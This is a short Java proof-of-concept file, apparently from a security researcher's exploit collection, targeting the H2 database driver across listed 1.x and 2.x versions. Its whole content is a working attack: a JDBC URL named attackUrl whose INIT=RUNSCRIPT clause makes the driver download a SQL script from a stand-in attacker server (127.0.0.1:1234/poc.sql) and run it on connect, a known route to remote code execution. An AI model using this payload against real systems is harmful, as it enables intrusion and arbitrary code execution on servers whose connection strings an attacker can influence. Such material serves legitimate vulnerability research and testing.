package h2database;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * RUNSCRIPT 远程加载 sql 文件
 *
 * version
 * com.h2database:h2
 * [1.3.x, 1.4.x, 2.0.x, 2.1.x, 2.2.x]
 * [1.2.130, 1.2.147]
 *
 * @author Whoopsunix
 */
public class RunScript {
    public static void main(String[] args) throws Exception {
        Class.forName("org.h2.Driver");

        String attackUrl = "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:1234/poc.sql'";
        Connection connection = DriverManager.getConnection(attackUrl);
    }
}
